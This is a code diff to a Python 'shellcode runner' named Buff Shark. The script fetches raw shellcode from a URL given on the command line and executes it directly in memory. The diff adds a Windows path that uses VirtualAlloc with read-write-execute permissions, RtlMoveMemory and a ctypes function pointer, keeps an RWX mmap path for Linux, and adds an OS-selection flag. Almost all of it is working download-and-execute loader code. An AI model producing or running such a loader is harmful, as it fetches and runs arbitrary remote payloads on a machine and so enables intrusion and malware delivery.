@@ -3,24 +3,30 @@ import sys
 import mmap
 import ctypes
 import pyaes
+import time
 import argparse
 import urllib.request
 
 #Buff Shark Python Shellcode Runner
 
+kernel32 = ctypes.windll.kernel32
+
 print("==========================")
 print("Buff Shark Shellcode Runner")
-print(" Author: Lenard Nguyen ")
+print(" Author: Momo Nguyen ")
 print("==========================")
 
 parser = argparse.ArgumentParser(description="Python Shellcode Runner")
 parser.add_argument('-u', '--url', type=str, metavar='', required=True, help="URL to raw shellcode file")
+parser.add_argument('-a', '--architecture', metavar='', required=True, help="Choose OS", choices=['win', 'nix'])
 args = parser.parse_args()
 
 
 
 def downloader(shellcode_url):
     with urllib.request.urlopen(shellcode_url) as f:
+        print("[+] Downloading shellcode...")
+        time.sleep(3)
         data = f.read()
         shellcode = bytearray(data)
         str1 = shellcode.decode('unicode_escape').encode("raw_unicode_escape")
@@ -28,21 +34,50 @@ def downloader(shellcode_url):
         print("[+] %s Bytes Downloaded!" % (file_size))
         return str1
 
-def write(str1):
+
+
+def write_linux(str1):
     mm = mmap.mmap(
             -1,
             mmap.PAGESIZE,
             mmap.MAP_SHARED,
             mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC,
             )
+    time.sleep(1)
+    print("[+] Running shellcode in memory...")
     mm.write(str1)
 
     addr = int.from_bytes(ctypes.string_at(id(mm) + 16, 8), "little")
 
     functype = ctypes.CFUNCTYPE(ctypes.c_void_p)
     fn = functype(addr)
+    time.sleep(2)
     fn()
 
+def write(buf):
+    length = len(buf)
+
+    kernel32.VirtualAlloc.restype = ctypes.c_void_p
+    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)
+
+    kernel32.RtlMoveMemory.argtypes = (
+        ctypes.c_void_p,
+        ctypes.c_void_p,
+        ctypes.c_size_t)
+    kernel32.RtlMoveMemory(ptr, buf, length)
+    return ptr
+
+
+def run(shellcode):
+    buf = ctypes.create_string_buffer(b"" + shellcode)
+    time.sleep(1)
+    print("[+] Running shellcode in memory...")
+    ptr = write(buf)
+    shell_func = ctypes.CFUNCTYPE(ctypes.c_void_p)
+    fn = shell_func(ptr)
+    time.sleep(2)
+    fn()
+    
 
 
 
@@ -66,16 +101,12 @@ def encrypt():
 
 
 
-
-
-
-
-
-
-
-
 if __name__ == "__main__":
-    str1 = downloader(args.url)
-    write(str1)
+    if args.architecture == 'win':
+        str1 = downloader(args.url)
+        run(str1)
+    elif args.architecture == 'nix':
+        str1 = downloader(args.url)
+        write_linux(str1)
 
     
